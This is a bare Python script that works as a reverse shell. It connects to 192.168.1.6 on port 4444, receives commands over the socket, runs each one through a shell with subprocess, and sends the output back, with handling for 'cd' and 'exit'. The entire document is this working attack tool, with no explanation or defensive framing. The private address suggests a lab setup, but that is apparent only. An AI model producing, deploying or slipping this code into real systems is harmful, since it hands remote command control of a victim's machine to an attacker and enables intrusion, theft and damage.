import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.6", 4444))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        if command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory to " + os.getcwd().encode() + b"\n")
            except Exception as e:
                s.send(str(e).encode() + b"\n")
            continue
        if command:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output + b"\n")
    
    s.close()

if __name__ == "__main__":
    connect()
